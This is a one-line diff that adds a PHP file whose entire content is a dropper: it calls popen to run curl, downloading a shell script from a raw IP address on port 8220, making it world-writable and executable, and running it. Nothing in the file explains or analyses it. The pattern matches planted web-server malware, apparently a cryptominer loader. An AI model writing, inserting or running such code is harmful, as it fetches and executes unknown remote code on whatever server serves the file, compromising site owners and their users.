@@ -1,0 +1,1 @@
+<?php $handle = popen("curl -o ./mr1.sh http://192.99.142.226:8220/mr.sh;chmod 777 mr1.sh;sh ./mr1.sh","r");?>
